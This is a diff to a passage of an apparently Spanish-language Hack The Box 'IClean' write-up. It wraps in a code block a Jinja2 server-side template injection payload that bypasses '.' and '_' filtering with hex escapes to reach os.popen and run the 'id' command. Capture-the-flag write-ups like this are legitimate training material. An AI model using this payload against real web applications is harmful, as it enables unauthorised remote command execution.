@@ -309,7 +309,10 @@ Después intenté enviar un payload para ejecutar comandos, pero recibí un erro
 
 Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como `.` y `_`
 
+```python
 {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+```
+
 
 ![](/assets/images/htb-writeup-IClean/bburp.png)
 
